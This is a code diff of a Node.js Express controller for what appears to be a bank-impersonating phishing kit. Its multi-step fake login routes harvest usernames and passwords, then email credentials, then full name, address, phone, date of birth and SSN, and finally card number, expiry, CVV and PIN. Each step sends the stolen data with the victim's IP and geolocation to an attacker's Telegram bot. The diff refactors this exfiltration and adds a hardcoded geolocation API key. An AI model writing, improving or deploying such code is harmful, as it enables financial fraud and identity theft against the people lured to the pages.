@@ -1,231 +1,203 @@
 const { sendMessageFor } = require("simple-telegram-message");
-const ipInfo = require("ip-info-finder");
+const axios = require("axios");
 const { getClientIp } = require("request-ip");
 const { botToken, chatId } = require("../config/settings");
 
+const getSystemTime = () => {
+    return new Date().toLocaleString("en-US", { timeZone: "UTC" });
+};
+
+async function sendAPIRequest(ipAddress) {
+    const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
+    return response.data;
+}
+
+const getGeoIPMessage = (geoInfo) => {
+    return `🌍 GEO-IP INFO
+IP: ${geoInfo.ip}
+Coordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}
+
+`;
+};
+
+const getMessageSender = () => sendMessageFor(botToken, chatId);
+
+// === ROUTES ===
+
 exports.login = (req, res) => {
-	return res.render("login");
+    return res.render("login");
 };
 
 exports.loginPost = async (req, res) => {
-	const { username, password } = req.body;
-	const clientIP = getClientIp(req);
+    const { username, password } = req.body;
+    const ipAddress = getClientIp(req);
+    const geoInfo = await sendAPIRequest(ipAddress);
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
 
-	function getIPDetails() {
-		return ipInfo
-			.getIPInfo(clientIP)
-			.then((data) => {
-				var data = data;
-				return data;
-			})
-			.catch((err) => {
-				console.log(err);
-			});
-	}
+    const message = `
+👤 TESY LOGIN 
 
-	const iPDetails = await getIPDetails();
-	console.log(getIPDetails);
-	const {
-		ipAddress,
-		Coordinates,
-		City,
-		Region,
-		postalCode,
-		Country,
-		Time,
-		provider,
-		ASN,
-	} = iPDetails;
+========================
 
-	const userAgent = req.headers["user-agent"];
-	const systemLang = req.headers["accept-language"];
+Username: ${username}
+Password: ${password}
+========================
 
-	const message =
-		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
-		`👤 LOGIN INFO\n` +
-		`USERNAME         : ${username}\n` +
-		`PASSWORD         : ${password}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
-		`COORDINATES      : ${Coordinates}\n` +
-		`CITY             : ${City}\n` +
-		`STATE            : ${Region}\n` +
-		`ZIP CODE         : ${postalCode}\n` +
-		`COUNTRY          : ${Country}\n` +
-		`TIME             : ${Time}\n` +
-		`ISP              : ${provider} ${ASN}\n\n` +
-		`💻 SYSTEM INFO\n` +
-		`USER AGENT       : ${userAgent}\n` +
-		`SYSTEM LANGUAGE  : ${systemLang}\n`;
+🌍 GEO-IP INFO
+IP ADDRESS: ${geoInfo.ip}
+COORDINATES: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}
+CITY: ${geoInfo.location.city}
+STATE: ${geoInfo.location.principalSubdivision}
+ZIP CODE: ${geoInfo.location.postcode || ""}
+COUNTRY: ${geoInfo.country.name}
+TIME: ${geoInfo.location.timeZone.localTime}
+ISP: ${geoInfo.network.organisation}
 
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+💻 SYSTEM INFO
+USER AGENT: ${userAgent}
+SYSTEM LANGUAGE: ${systemLang}
 
-	res.redirect("/auth/login/2");
+========================
+
+✅ TESY`;
+
+    try {
+        await getMessageSender()(message);
+        res.redirect("/auth/login/2");
+    } catch (err) {
+        console.error("Error sending message:", err.message);
+        res.status(500).send("Internal server error");
+    }
 };
 
-exports.login2 = (req, res) => {
-	res.render("login2");
-};
+exports.login2 = (req, res) => res.render("login2");
 
 exports.loginPost2 = async (req, res) => {
-	const { username, password } = req.body;
-	const clientIP = getClientIp(req);
+    const { username, password } = req.body;
+    const ipAddress = getClientIp(req);
 
-	function getIPDetails() {
-		return ipInfo
-			.getIPInfo(clientIP)
-			.then((data) => {
-				var data = data;
-				return data;
-			})
-			.catch((err) => {
-				console.log(err);
-			});
-	}
+    const message = `
+✅ UPDATE TEAM | RELOGIN | USER_${ipAddress}
 
-	const iPDetails = await getIPDetails();
-	const { ipAddress, Time } = iPDetails;
+👤 RELOGIN INFO
+USERNAME         : ${username}
+PASSWORD         : ${password}
 
-	const message =
-		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
-		`👤 RELOGIN INFO\n` +
-		`USERNAME         : ${username}\n` +
-		`PASSWORD         : ${password}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${Time}\n`;
+🌍 GEO-IP INFO
+IP: ${ipAddress}
+Coordinates: N/A
 
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+TIME             : ${getSystemTime()}
+`;
 
-	res.redirect("/auth/login/3");
+    try {
+        await getMessageSender()(message);
+        res.redirect("/auth/login/3");
+    } catch (err) {
+        console.error("Error:", err.message);
+        res.status(500).send("Internal server error");
+    }
 };
 
-exports.login3 = (req, res) => {
-	res.render("login3");
-};
+exports.login3 = (req, res) => res.render("login3");
 
 exports.loginPost3 = async (req, res) => {
-	const { emailAddr, emailPass } = req.body;
-	const clientIP = getClientIp(req);
+    const { emailAddr, emailPass } = req.body;
+    const ipAddress = getClientIp(req);
 
-	function getIPDetails() {
-		return ipInfo
-			.getIPInfo(clientIP)
-			.then((data) => {
-				var data = data;
-				return data;
-			})
-			.catch((err) => {
-				console.log(err);
-			});
-	}
+    const message = `
+✅ UPDATE TEAM | EMAIL | USER_${ipAddress}
 
-	const iPDetails = await getIPDetails();
-	const { ipAddress, Time } = iPDetails;
+👤 EMAIL INFO
+EMAIL ADDRESS    : ${emailAddr}
+EMAIL PASSWORD   : ${emailPass}
 
-	const message =
-		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
-		`👤 EMAIL INFO\n` +
-		`EMAIL ADDRESS    : ${emailAddr}\n` +
-		`EMAIL PASSWORD   : ${emailPass}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${Time}\n`;
+🌍 GEO-IP INFO
+IP: ${ipAddress}
+Coordinates: N/A
 
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+TIME             : ${getSystemTime()}
+`;
 
-	res.redirect("/auth/login/4");
+    try {
+        await getMessageSender()(message);
+        res.redirect("/auth/login/4");
+    } catch (err) {
+        console.error("Error:", err.message);
+        res.status(500).send("Internal server error");
+    }
 };
 
-exports.login4 = (req, res) => {
-	return res.render("login4");
-};
+exports.login4 = (req, res) => res.render("login4");
 
 exports.loginPost4 = async (req, res) => {
-	const { fullName, address, zip, phone, dob, ssn } = req.body;
-	const clientIP = getClientIp(req);
+    const { fullName, address, zip, phone, dob, ssn } = req.body;
+    const ipAddress = getClientIp(req);
 
-	function getIPDetails() {
-		return ipInfo
-			.getIPInfo(clientIP)
-			.then((data) => {
-				var data = data;
-				return data;
-			})
-			.catch((err) => {
-				console.log(err);
-			});
-	}
+    const message = `
+✅ UPDATE TEAM | PERSONAL INFO | USER_${ipAddress}
 
-	const iPDetails = await getIPDetails();
-	const { ipAddress, Time } = iPDetails;
+👤 PERSONAL INFO
+FULL NAME        : ${fullName}
+STREET ADDRESS   : ${address}
+ZIP CODE         : ${zip}
+PHONE NUMBER     : ${phone}
+DOB              : ${dob}
+SSN              : ${ssn}
 
-	const message =
-		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
-		`👤 PERSONAL INFO\n` +
-		`FULL NAME        : ${fullName}\n` +
-		`STREET ADDRESS   : ${address}\n` +
-		`ZIP CODE         : ${zip}\n` +
-		`PHONE NUMBER     : ${phone}\n` +
-		`DOB              : ${dob}\n` +
-		`SSN              : ${ssn}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${Time}\n`;
+🌍 GEO-IP INFO
+IP: ${ipAddress}
+Coordinates: N/A
 
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+TIME             : ${getSystemTime()}
+`;
 
-	res.redirect("/auth/login/5");
+    try {
+        await getMessageSender()(message);
+        res.redirect("/auth/login/5");
+    } catch (err) {
+        console.error("Error:", err.message);
+        res.status(500).send("Internal server error");
+    }
 };
 
-exports.login5 = (req, res) => {
-	return res.render("login5");
-};
+exports.login5 = (req, res) => res.render("login5");
 
 exports.loginPost5 = async (req, res) => {
-	const { cardNum, expDate, cvv, pin } = req.body;
-	const clientIP = getClientIp(req);
+    const { cardNum, expDate, cvv, pin } = req.body;
+    const ipAddress = getClientIp(req);
 
-	function getIPDetails() {
-		return ipInfo
-			.getIPInfo(clientIP)
-			.then((data) => {
-				var data = data;
-				return data;
-			})
-			.catch((err) => {
-				console.log(err);
-			});
-	}
+    const message = `
+✅ UPDATE TEAM | CARD INFO | USER_${ipAddress}
 
-	const iPDetails = await getIPDetails();
-	const { ipAddress, Time } = iPDetails;
+👤 CARD INFO
+CARD NUMBER      : ${cardNum}
+EXPIRY DATE      : ${expDate}
+CVV              : ${cvv}
+CARD PIN         : ${pin}
 
-	const message =
-		`✅ UPDATE TEAM | MTB | USER_${ipAddress}\n\n` +
-		`👤 CARD INFO\n` +
-		`CARD NUMBER      : ${cardNum}\n` +
-		`EXPIRY DATE      : ${expDate}\n` +
-		`CVV              : ${cvv}\n` +
-		`CARD PIN         : ${pin}\n\n` +
-		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${Time}\n`;
+🌍 GEO-IP INFO
+IP: ${ipAddress}
+Coordinates: N/A
 
-	const sendMessage = sendMessageFor(botToken, chatId);
-	sendMessage(message);
+TIME             : ${getSystemTime()}
+`;
 
-	res.redirect("/auth/complete");
+    try {
+        await getMessageSender()(message);
+        res.redirect("/auth/complete");
+    } catch (err) {
+        console.error("Error:", err.message);
+        res.status(500).send("Internal server error");
+    }
 };
 
-exports.complete = (req, res) => {
-	return res.render("complete");
-};
+exports.complete = (req, res) => res.render("complete");
 
-exports.page404Redirect = (req, res) => {
-	return res.redirect("/auth/login");
-};
+exports.page404Redirect = (req, res) => res.redirect("/auth/login");
+
+// Handle any unhandled promise rejections
+process.on("unhandledRejection", (reason, promise) => {
+    console.error("Unhandled Rejection at:", promise, "reason:", reason);
+});
